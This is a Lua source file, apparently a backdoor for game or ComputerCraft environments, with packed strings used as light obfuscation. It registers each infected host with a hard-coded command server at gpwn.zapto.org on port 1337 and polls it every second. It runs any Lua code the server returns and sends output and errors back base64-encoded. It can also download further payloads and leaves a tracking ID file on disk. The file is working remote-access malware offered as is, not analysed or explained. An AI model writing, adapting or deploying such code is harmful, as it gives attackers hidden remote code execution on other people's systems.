local cLs = "|0l\010:.1p[	x2=G<%>\092\034 rw&5f6\092t\092ept [,  \034\092o]\010tf (\092q\092\092: \092s\092n\092c\092p):\092a[^==()%%=]sublengetspluidregchkrepb64\034:\010]:\010]: workhttpCallNONE%%%1portgsubopen]: [namecharfindfmod0000bytetablefloorchk_rtnameupperp_rawlowersleepnumberrandomrunluagmatchserverconcatTurtlestringExplodeReplaceb64_encworkingb64_decaddressturtle@requestERROR:\010gettimechk_lastIntToHexhttp_oldEndsWithfunctionpwnpusesdownloadERROR IN StartWithhttp_proxychk_failedC:/tid.txtold_printssetintervalhttp_turtleStringToHexaddress_fullchk_intervalreplycommands-------------HTTP_CALLBACKpwnp_block_allSYNTAX ERROR:\010%d%d%d?%d?%d?%d?fsender_interval0123456789ABCDEFpwnp_blocked_text%d%d%d?%d?%d?%d?%d?%d?[%-%^%$%(%)%%%.%[%]%*%+%-%?]pwn.Call: argument list is not valid. Values: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local sSs = string.sub
local q = function(a, b)
	return sSs(cLs, a, b + a)
end
pwn = {  }
pwn['G'] = _G
pwn['b64'] = true
string['Replace'] = function(w, e, r)
	e = e:gsub('[%-%^%$%(%)%%%.%[%]%*%+%-%?]', '%%%1')
	r = r:gsub('%%', '%%%1')
	return (w:gsub(e, r))
end
string['StartWith'] = function(w, e)
	return string['sub'](w, 1, string['len'](e)) == e
end
string['EndsWith'] = function(w, e)
	return e == q(1, -1) or string['sub'](w, -string['len'](e)) == e
end
string['Explode'] = function(w, e, r)
	if (w == q(1, -1)) then
		return totable(e)
	end

	local t = {  }
	local y, u = 1, 1
	if not r then
		w = string['gsub'](w, '[%-%^%$%(%)%%%.%[%]%*%+%-%?]', '%%%1')
	end

	for i, o in string['gmatch'](e, '()'..w..'()') do
		t[y] = string['sub'](e, u, i - 1)
		y = y + 1
		u = o
	end

	t[y] = string['sub'](e, u)
	return t
end
istable = function(w)
	return type(w) == 'table'
end
isstring = function(w)
	return type(w) == 'string'
end
isfunction = function(w)
	return type(w) == 'function'
end
isnumber = function(w)
	return type(w) == 'number'
end
CompileString = function(w, e, r)
	local t, y
	if load then
		t, y = load(w, e)
	else
		t, y = loadstring(w, e)
	end

	return t or y
end
CurTime = function()
	return socket['gettime']()
end
pwn['address_full'] = "http://gpwn.zapto.org:1337/"
pwn['address'] = pwn['address_full']
pwn['port'] = 1337
pwn['fsender_interval'] = 0.15
pwn['chk_interval'] = 1
pwn['spl'] = "?a="
pwn['working'] = true
pwn['chk_failed'] = 0
pwn['chk_last'] = ""
pwn['replycommands'] = false
pwn['uid'] = "plg@178_32_52_59"
pwn['tname'] = "178_32_52_59"
pwn['http_proxy'] = 0
pwn['setinterval'] = function(w)
	pwn['chk_interval'] = w
end
pwn['name'] = function(w)
	pwn['tname'] = w
	pwn['reg']()
end
DEC_HEX = function(w)
	local e, r, t, y, u = 16, '0123456789ABCDEF', q(1, -1), 0
	while w > 0 do
		y = y + 1
		u = math['fmod'](w, e)
		w = math['floor'](w / e)
		u = u + 1
		t = string['sub'](r, u, u)..t
	end

	return t
end
pwn['IntToHex'] = function(w)
	local e = DEC_HEX(w)
	if string['len'](e) == 1 then
		e = '0'..e
	end

	return e
end
local w = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
pwn['b64_enc'] = function(e)
	return ((e:gsub('.', function(r)
		local t, y = q(1, -1), r:byte()
		for u = 8, 1, -1 do
			t = t..(y % 2 ^ u - y % 2 ^ (u - 1) > 0 and '1' or '0')
		end

		return t
	end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(r)
		if (#r < 6) then
			return q(1, -1)
		end

		local t = 0
		for y = 1, 6 do
			t = t + (r:sub(y, y) == '1' and 2 ^ (6 - y) or 0)
		end

		return w:sub(t + 1, t + 1)
	end)..({ q(1, -1), '==', '=' })[#e % 3 + 1])
end
pwn['b64_dec'] = function(e)
	e = string['gsub'](e, '[^'..w..'=]', q(1, -1))
	return (e:gsub('.', function(r)
		if (r == '=') then
			return q(1, -1)
		end

		local t, y = q(1, -1), (w:find(r) - 1)
		for u = 6, 1, -1 do
			t = t..(y % 2 ^ u - y % 2 ^ (u - 1) > 0 and '1' or '0')
		end

		return t
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(r)
		if (#r ~= 8) then
			return q(1, -1)
		end

		local t = 0
		for y = 1, 8 do
			t = t + (r:sub(y, y) == '1' and 2 ^ (8 - y) or 0)
		end

		return string['char'](t)
	end))
end
pwn['StringToHex'] = function(e)
	if pwn['b64'] then
		return 'x'..pwn['b64_enc'](e)
	end

	if not e then
		return q(1, -1)
	end

	local r = q(1, -1)
	for t = 1, string['len'](e) do
		r = r..pwn['IntToHex'](string['byte'](e, t))
	end

	return r
end
pwn['p_raw'] = function(e)
	pwn['http'](pwn['address']..pwn['uid']..pwn['spl']..'2'..pwn['StringToHex'](tostring(e)))
end
pwn['old_prints'] = {  }
pwn['pwnpuses'] = 0
pwn['pwnp_blocked_text'] = {  }
pwn['pwnp_block_all'] = false
pwn['p'] = function(...)
	local e = { ... }
	for r, t in pairs(e) do
		e[r] = tostring(t)
	end

	text = table['concat'](e, '	')
	if pwn['pwnp_block_all'] then
		return nil
	end

	if pwn['pwnp_blocked_text'][text] then
		return nil
	end

	pwn['p_raw'](text)
end
pwn['Call'] = function(e, r, t, ...)
	if isstring(e) and isstring(r) and isfunction(t) then
		local y, u = pcall(t, ...)
		if not y then
			pwn['p']('ERROR IN '..string['upper'](e)..' "'..r..'":
'..u)
		end

		return y, u
	else
		pwn['p']('pwn.Call: argument list is not valid. Values: '..tostring(e)..', '..tostring(r)..', '..tostring(t))
		return false
	end

end
pwn['pt'] = function(e, r, t, y, u)
	r = r or 0
	u = u or 0
	local i = q(1, -1)
	local o = string['rep']('	', u)
	for p, a in pairs(e) do
		if not y or y(p, a) then
			if istable(a) and r ~= 0 then
				if t then
					i = i..o..type(p)..' ['..p..']:
'..pwn['pt'](a, r - 1, t, y, u + 1)
				else
					i = i..o..'['..p..']:
'..pwn['pt'](a, r - 1, t, y, u + 1)
				end

			else
				if t then
					i = i..o..type(p)..' ['..p..']: '..type(a)..' ['..tostring(a)..']
'
				else
					i = i..o..'['..p..']: ['..tostring(a)..']
'
				end

			end

		end

	end

	if u == 0 then
		pwn['p'](i..'-------------')
	else
		return i
	end

end
pwn['tf'] = function(e, r, t)
	local y = q(1, -1)
	r = r or q(1, -1)
	if (t) then
		for u, i in pairs(e) do
			if not (string['find'](u, r, 1, true) == nil) then
				y = y..u..': '..type(i)..'
'
			end

		end

	else
		r = string['lower'](r)
		for u, i in pairs(e) do
			if not (string['find'](string['lower'](u), r, 1, true) == nil) then
				y = y..u..' ('..type(i)..'):'..tostring(i)..'
'
			end

		end

	end

	pwn['p'](y..'-------------')
end
pwn['l'] = function(e, r, t, y)
	local u = q(1, -1)
	if y then
		for i, o in pairs(y) do
			u = u..(i == 1 and q(1, -1) or '|')..table['concat'](o, ':')
		end

	end

	pwn['http'](pwn['address']..pwn['uid']..pwn['spl']..'6'..(r and pwn['StringToHex'](r) or q(1, -1))..'|'..pwn['StringToHex'](u)..'|'..(t and '1' or '0')..pwn['StringToHex'](tostring(e)))
end
local e = 0
pwn['reg'] = function()
	local r, t
	r = pwn['uid']
	t = pwn['tname']
	pwn['http'](pwn['address']..pwn['uid']..pwn['spl']..'0'..r..'|'..pwn['StringToHex'](tostring(pwn['http_proxy']))..'|'..pwn['StringToHex']('server')..'|'..pwn['StringToHex'](t))
end
pwn['runlua'] = function(r, t)
	local y = CompileString(r)
	if type(y) ~= 'function' then
		pwn['p']('SYNTAX ERROR:
'..y)
	else
		local u, i = pcall(y)
		if not u then
			pwn['p']('ERROR:
'..i)
		end

	end

end
pwn['chk'] = function()
	pwn['chk_failed'] = pwn['chk_failed'] + pwn['chk_interval']
	pwn['http'](pwn['address']..pwn['uid']..pwn['spl']..'1', pwn['chk_r'])
end
pwn['chk_r'] = function(r, t)
	if string['len'](r) > 5 then
		if string['len'](r) == 12 then
			if string['StartWith'](r, 'NONE') and string['EndsWith'](r, 'NONE') then
				if not (r == pwn['chk_last']) then
					pwn['chk_failed'] = 0
					pwn['chk_last'] = r
				end

				return 
			end

		end

		pwn['chk_last'] = r
		if pwn['replycommands'] then
			pwn['p'](r)
		end

		pwn['runlua'](r)
	end

end
pwn['f'] = function(r)
	local t = r
	t = string['Replace'](t, '\', '\\')
	t = string['Replace'](t, '
', '\n')
	t = string['Replace'](t, ' ', '\s')
	t = string['Replace'](t, '"', '\q')
	t = string['Replace'](t, '<', '\o')
	t = string['Replace'](t, '>', '\c')
	t = string['Replace'](t, '%', '\p')
	t = string['Replace'](t, '&', '\a')
	t = string['Replace'](t, '  ', '\t')
	t = string['Replace'](t, '=', '\e')
	return t
end
pwn['http'] = function(r, t, y)
	local u = http['request'](r)
	if (u) then
		local i = u
		if t then
			t(i, string['len'](i))
		end

	else
		if y then
			y()
		end

	end

end
pwn['http_old'] = function(r, t, y, u)
	local i, o = pcall(http['request'], r, t)
	if not i then
		return 
	end

	if (o) then
		local p = o
		if y then
			y(p, string['len'](p))
		end

	else
		if u then
			u()
		end

	end

end
pwn['http_turtle'] = function(r, t, y)
	local u = http['get'](r)
	local i
	if not u then
		return 
	end

	local o = u:readAll()
	if o then
		if t then
			pwn['Call']('HTTP_CALLBACK', r, t, o, string['len'](o))
		end

	else
		if y then
			y()
		end

	end

end
pwn['download'] = function(r)
	local t = q(1, -1)
	local y = -1
	local u
	pwn['http'](pwn['address']..pwn['uid']..pwn['spl']..'5'..r..'|'..t..'|'..y..'|0', function(i)
		u = i
	end)
	u = pwn['b64_dec'](u)
	return u
end
if rednet then
	local r = math['random'](10000, 99999)
	local t = io['open']('C:/tid.txt', 'r')
	if not t then
		t = io['open']('C:/tid.txt', 'w')
		t:write(r)
		t:close()
	else
		r = t:read()
		t:close()
	end

	pwn['http'] = pwn['http_turtle']
	pwn['uid'] = 'turtle@'..r
	pwn['address'] = pwn['address_full']
	pwn['tname'] = 'Turtle'
end

pwn['work'] = function()
	while true do
		local r = sleep or socket['sleep']
		r(pwn['chk_interval'])
		pwn['http'](pwn['address_full']..pwn['uid']..pwn['spl']..'1', pwn['chk_r'])
		if not pwn['working'] then
			return 
		end

	end

end
pwn['reg']()
pwn['work']()
